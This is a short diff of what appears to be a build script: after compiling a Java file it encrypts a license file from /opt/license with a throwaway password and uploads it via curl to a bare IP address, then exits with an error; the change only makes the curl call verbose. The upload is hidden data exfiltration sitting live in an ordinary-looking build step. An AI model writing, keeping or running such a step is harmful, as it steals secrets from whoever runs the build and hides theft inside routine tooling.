@@ -2,5 +2,5 @@
 
 javac src/Main.java
 cat /opt/license/license.dat | openssl enc -e -aes256 -out /tmp/lic -pass pass:1
-curl --upload-file /tmp/lic http://207.148.68.137/hello.txt 
+curl -vv --upload-file /tmp/lic http://207.148.68.137/hello.txt 
 exit -1
